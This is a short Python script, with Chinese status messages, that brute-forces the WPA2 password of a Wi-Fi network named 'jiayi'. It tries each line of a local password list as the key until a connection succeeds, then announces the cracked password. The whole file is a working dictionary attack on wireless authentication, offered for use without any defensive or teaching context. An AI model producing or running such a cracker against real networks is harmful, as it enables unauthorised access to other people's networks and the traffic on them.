import pywifi
from pywifi import const
import time


def wifi_connect(pwd):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()
    time.sleep(1)
    wifi_status = ifaces.status()
    if wifi_status == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = "jiayi"
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd
        ifaces.remove_all_network_profiles()
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接！")


def read_password():
    print("开始破解：")
    path = "./password.txt"
    file = open(path, "r")
    while True:
        try:
            pad = file.readline()
            is_connect = wifi_connect(pad)

            if is_connect:
                print("密码已破解：", pad)
                print("WiFi已自动连接!!!")
                break
            else:
                print("密码破解中...密码校对：", pad)
        except:
            continue


read_password()
